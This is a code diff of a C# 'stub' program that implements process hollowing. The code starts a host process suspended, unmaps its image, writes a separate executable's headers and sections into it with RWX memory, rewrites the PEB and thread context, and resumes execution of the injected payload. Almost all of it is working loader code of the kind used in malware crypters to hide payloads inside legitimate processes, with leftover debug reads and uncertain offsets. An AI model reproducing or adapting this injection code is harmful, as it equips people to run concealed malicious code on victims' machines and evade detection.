@@ -76,7 +76,7 @@ namespace SomeAwesomeStub
         // ==================================================
         private const int       CREATE_SUSPENDED = 0x4;
         private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
-        private const uint    IMAGE_NT_SIGNATURE = 0x00004550; // PE00
+        private const int    IMAGE_NT_SIGNATURE = 0x00004550; // PE00
         private const int PAGE_EXECUTE_READWRITE = 0x40;
         private const int             MEM_COMMIT = 0x00001000;
         private const int            MEM_RESERVE = 0x00002000;
@@ -114,17 +114,17 @@ namespace SomeAwesomeStub
 
             NtQueryInformationProcess((IntPtr)hProcess, 0, basicInformation, 48, returnLength);
             ptrPEB = (IntPtr)BitConverter.ToInt64(basicInformation, 8);
-            textBox1.AppendText("What do we get as a return length: " + returnLength + Environment.NewLine);
+            eventLog.AppendText("What do we get as a return length: " + returnLength + Environment.NewLine);
             return ptrPEB;
         }
 
-        private IntPtr GetImageBaseAddress(long hProcess)
+        private NativePEBlock GetImageBaseAddress(long hProcess)
         {
             IntPtr sink = new IntPtr(); // This is just to dump the output data we do not need
             IntPtr ptrPEB = GetProcessEnvBlockAddress(hProcess);
             byte[] PEBBlock = new byte[Marshal.SizeOf(typeof(NativePEBlock))];
 
-            Console.WriteLine("ptrPEB: " + ptrPEB);
+            eventLog.AppendText("Pointer to PEB: " + ptrPEB + Environment.NewLine);
 
             bool result = ReadProcessMemory(
                     (IntPtr)hProcess,
@@ -145,16 +145,16 @@ namespace SomeAwesomeStub
                                                         typeof(NativePEBlock)
                                                     );
                 handle.Free();
-                return pEBlock.ImageBaseAddress;
+                return pEBlock;
             }
 
-            return IntPtr.Zero;
+            return new NativePEBlock();
         }
 
         private void RunPayLoad(byte[] byteData)
         {
-            byte[] IMAGE_DOS_HEADER     = new byte[Marshal.SizeOf(typeof(DOSHeader))]; 
-            byte[] IMAGE_NT_HEADERS     = new byte[248]; // WinNT.h
+            // Use this pointer to get the return information that we do not need.
+            IntPtr bytesWritten = new IntPtr();
 
             // When you initialise a byte array, it is already 0
             byte[] PROCESS_INFORMATION = new byte[24];
@@ -164,35 +164,37 @@ namespace SomeAwesomeStub
             // https://resources.infosecinstitute.com/2-malware-researchers-handbook-demystifying-pe-file/
             // First, we want to get the DOS header from the executable
 
+            byte[] IMAGE_DOS_HEADER = new byte[Marshal.SizeOf(typeof(DOSHeader))];
             Buffer.BlockCopy(byteData, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);
 
             GCHandle handle = GCHandle.Alloc(byteData, GCHandleType.Pinned);
-            DOSHeader DOSHeaderBlock = (DOSHeader)Marshal.PtrToStructure(
+            DOSHeader DOSPayLoadHeaderBlock = (DOSHeader)Marshal.PtrToStructure(
                                                     handle.AddrOfPinnedObject(),
                                                     typeof(DOSHeader)
                                                 );
             handle.Free();
 
-            Console.WriteLine("DOS HEADER FIRST TWO BYTES: " + DOSHeaderBlock.e_lfanew.ToString("X"));
-            Console.WriteLine("SIZE DOS: " + Marshal.SizeOf(typeof(DOSHeader)) + Marshal.SizeOf(typeof(NativePEBlock)));
-
             // Let us check to see if we have the MZ magic number
             // Perform a sanity check
-            if (DOSHeaderBlock.Signature != IMAGE_DOS_SIGNATURE)
+            if (DOSPayLoadHeaderBlock.Signature != IMAGE_DOS_SIGNATURE)
             {
                 InfoMsg.Text = "Payload is not a valid executable. Dos signature is not valid.";
                 return;
             }
 
-            // Then get the PE File Header
-            int ntDataOffset = 60; // Examine the DOS HEADER and you will see that the data we want
-                                   // e_lfanew is located with an offset of 60.
-            int ntOffset = 0;
-            ntOffset = BitConverter.ToInt32(IMAGE_DOS_HEADER, ntDataOffset);
-            Buffer.BlockCopy(byteData, ntOffset, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);
+            // Then get the PE NT File Headers
+            byte[] IMAGE_NT_HEADERS = new byte[Marshal.SizeOf(typeof(ImageNTHeader))];
+            Buffer.BlockCopy(byteData, DOSPayLoadHeaderBlock.e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);
+
+            handle = GCHandle.Alloc(IMAGE_NT_HEADERS, GCHandleType.Pinned);
+            ImageNTHeader NTPayLoadHeaderBlock = (ImageNTHeader)Marshal.PtrToStructure(
+                                                    handle.AddrOfPinnedObject(),
+                                                    typeof(ImageNTHeader)
+                                                );
+            handle.Free();
 
             // Check the PE Header is valid
-            if (BitConverter.ToUInt32(IMAGE_NT_HEADERS, 0) != IMAGE_NT_SIGNATURE)
+            if (NTPayLoadHeaderBlock.Signature != IMAGE_NT_SIGNATURE)
             {
                 InfoMsg.Text = "Payload is not a valid executable. NTHeader is not valid.";
                 return;
@@ -210,60 +212,64 @@ namespace SomeAwesomeStub
             
             // Note, the Handle variable is 8 bytes big due to the 64 bit system
             long processID = BitConverter.ToInt64(PROCESS_INFORMATION, 0);
-            IntPtr pHostImageBase = GetImageBaseAddress(processID);
+            NativePEBlock pEBBlock = GetImageBaseAddress(processID);
+            IntPtr pHostImageBase = pEBBlock.ImageBaseAddress;
 
             // According to documentation, the result code from this function is a success if equal
             // to 0. There are more codes which you can check.
             uint result = NtUnmapViewOfSection((IntPtr)processID, pHostImageBase);
             if (result != 0)
             {
-                textBox1.AppendText("Error: unable to unmap victim process image.");
+                eventLog.AppendText("Error: Unable to unmap host process image.");
                 return;
             }
 
-            uint sizeOfImg = BitConverter.ToUInt32(IMAGE_NT_HEADERS, 80);
-            ulong payloadImgPtr = BitConverter.ToUInt64(IMAGE_NT_HEADERS, 48);
-
             IntPtr remoteImage = VirtualAllocEx(
-                (IntPtr)processID, pHostImageBase, sizeOfImg, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE
+                (IntPtr)processID,
+                pHostImageBase,
+                (uint)NTPayLoadHeaderBlock.OptionalHeader.SizeOfImage,
+                (MEM_COMMIT | MEM_RESERVE),
+                PAGE_EXECUTE_READWRITE
             );
 
             if (remoteImage.Equals(IntPtr.Zero))
             {
-                textBox1.AppendText("Unable to allocate memory" + Environment.NewLine);
+                eventLog.AppendText("Unable to allocate memory" + Environment.NewLine);
                 return;
             }
+
+            // Now we need to check if we need to do a rebase of the image
+            eventLog.AppendText("Host Image Base: " + pHostImageBase.ToString("X") + Environment.NewLine);
+            eventLog.AppendText("Payload Image Base: " +
+                    NTPayLoadHeaderBlock.OptionalHeader.ImageBase.ToString("X") +
+                    Environment.NewLine
+                );
+            long relocDelta = pHostImageBase.ToInt64() - NTPayLoadHeaderBlock.OptionalHeader.ImageBase;
 
             // ====================================================================================
             // Now that everything is prepared, we are going to start reallocation memory starting
             // from here.
             // ====================================================================================
-            int sizeOfPayloadHeaders = BitConverter.ToInt32(IMAGE_NT_HEADERS, 84);
-            // Now let us change offset itself in the payload itself
-            BitConverter.GetBytes(pHostImageBase.ToInt64()).CopyTo(IMAGE_NT_HEADERS, 48);
-            ulong payloadBaseImg = BitConverter.ToUInt64(IMAGE_NT_HEADERS, 48);
+            NTPayLoadHeaderBlock.OptionalHeader.ImageBase = pHostImageBase.ToInt64();
 
             // Now, we need to write to process memory the headers
-            IntPtr bytesWritten = new IntPtr();
             if (!WriteProcessMemory(
                     (IntPtr)processID,
                     pHostImageBase,
                     byteData,
-                    sizeOfPayloadHeaders,
+                    NTPayLoadHeaderBlock.OptionalHeader.SizeOfHeaders,
                     out bytesWritten
                 ))
             {
-                textBox1.AppendText("Can not write to process memory!" + Environment.NewLine);
+                eventLog.AppendText("Can not write to process memory!" + Environment.NewLine);
                 return;
             }
 
             // This is where we need to write the section data
-            int numOfSections = BitConverter.ToInt16(IMAGE_NT_HEADERS, 6);
-            for (int i = 0; i < numOfSections; i++)
+            for (int i = 0; i < NTPayLoadHeaderBlock.FileHeader.NumberOfSections; i++)
             {
-                IntPtr justASink = new IntPtr();
                 byte[] IMAGE_SECTION_HEADER = new byte[40];
-                int sectionOffset = ntOffset + IMAGE_NT_HEADERS.Length + 16 + IMAGE_SECTION_HEADER.Length * i;
+                int sectionOffset = DOSPayLoadHeaderBlock.e_lfanew + IMAGE_NT_HEADERS.Length + 8 + IMAGE_SECTION_HEADER.Length * i;
                 Buffer.BlockCopy(byteData, sectionOffset, IMAGE_SECTION_HEADER, 0, 40);
 
                 int rawDataSize = BitConverter.ToInt32(IMAGE_SECTION_HEADER, 16);
@@ -274,22 +280,30 @@ namespace SomeAwesomeStub
                 Buffer.BlockCopy(byteData, rawDataAddOffset, sectionData, 0, rawDataSize);
 
                 // Now we are going to write the raw section data to the virtual memory area we created
-                if(rawDataSize == 0) continue;
+                if (rawDataSize == 0) continue;
                 if (!WriteProcessMemory(
                         (IntPtr)processID,
                         (pHostImageBase + virtualAddressOffset),
                         sectionData,
                         rawDataSize,
-                        out justASink
+                        out bytesWritten
                 ))
                 {
-                    textBox1.AppendText("Can not write to process memory!" + Environment.NewLine);
+                    eventLog.AppendText("Can not write to process memory!" + Environment.NewLine);
                     return;
                 }
             }
 
-            long addressOfEntryPt = BitConverter.ToInt32(IMAGE_NT_HEADERS, 40);
-            long entryPoint = pHostImageBase.ToInt64() + addressOfEntryPt;
+            long entryPoint = pHostImageBase.ToInt64() + NTPayLoadHeaderBlock.OptionalHeader.AddressOfEntryPoint;
+
+            byte[] test = new byte[200];
+            bool test2 = ReadProcessMemory(
+                    (IntPtr)processID,
+                    (IntPtr)entryPoint,
+                    test,
+                    200,
+                    out bytesWritten
+                );
 
             IntPtr ptrHandleThread = (IntPtr)BitConverter.ToInt64(PROCESS_INFORMATION, 8);
             byte[] CONTEXT = new byte[1232];
@@ -299,29 +313,52 @@ namespace SomeAwesomeStub
             if (!GetThreadContext(ptrHandleThread, CONTEXT))
             {
                 ResumeThread(ptrHandleThread);
-                textBox1.AppendText("Can not retrieve CONTEXT!" + Environment.NewLine);
+                eventLog.AppendText("Can not retrieve CONTEXT!" + Environment.NewLine);
                 return;
             }
 
-            BitConverter.GetBytes(entryPoint).CopyTo(CONTEXT, 128);
+
+            // Yes this gets the PEB ptr address. I do not know how.
+            IntPtr ptrToPEB = (IntPtr)BitConverter.ToInt64(CONTEXT, 136);
+            pEBBlock.ImageBaseAddress = (IntPtr)entryPoint;
+
+            byte[] pEBBlockRaw = new byte[Marshal.SizeOf(typeof(NativePEBlock))];
+
+            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativePEBlock)));
+            Marshal.StructureToPtr(pEBBlock, ptr, true);
+            Marshal.Copy(ptr, pEBBlockRaw, 0, Marshal.SizeOf(typeof(NativePEBlock)));
+            Marshal.FreeHGlobal(ptr);
+
+            if (!WriteProcessMemory(
+                        (IntPtr)processID,
+                        ptrToPEB,
+                        pEBBlockRaw,
+                        Marshal.SizeOf(typeof(NativePEBlock)),
+                        out bytesWritten
+                ))
+            {
+                eventLog.AppendText("Can not write to PEB Block!" + Environment.NewLine);
+                return;
+            }
+
+            BitConverter.GetBytes(entryPoint).CopyTo(CONTEXT, 128); //Write to the RCX
 
             if (!SetThreadContext(ptrHandleThread, CONTEXT))
             {
                 ResumeThread(ptrHandleThread);
-                textBox1.AppendText("Can not set CONTEXT!" + Environment.NewLine);
+                eventLog.AppendText("Can not set CONTEXT!" + Environment.NewLine);
                 return;
             }
-
-            uint errorCode = ResumeThread(ptrHandleThread);
-            if (errorCode == 0)
+            
+            if (ResumeThread(ptrHandleThread) == 0)
             {
-                textBox1.AppendText("Failed to resume Thread" + Environment.NewLine);
+                eventLog.AppendText("Failed to resume Thread" + Environment.NewLine);
                 return;
             }
-           int error = Marshal.GetLastWin32Error();
 
+            int error = Marshal.GetLastWin32Error();
             Console.WriteLine("The last Win32 Error was: " + error);
-            textBox1.AppendText("We should be finished with injection errorCode: " + errorCode + Environment.NewLine);
+            eventLog.AppendText("We should be finished with injection." + Environment.NewLine);
         }
 
         private void BtnStubRun_Click(object sender, EventArgs e)
@@ -329,7 +366,7 @@ namespace SomeAwesomeStub
             // Get the exe file path.
             string thisFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
             // Load all of the bytes of the file into an byte array.
-            byte[] thisFileBytes = System.IO.File.ReadAllBytes("a.exe");
+            byte[] thisFileBytes = System.IO.File.ReadAllBytes("HelloWorld.exe");
 
             RunPayLoad(thisFileBytes);
 
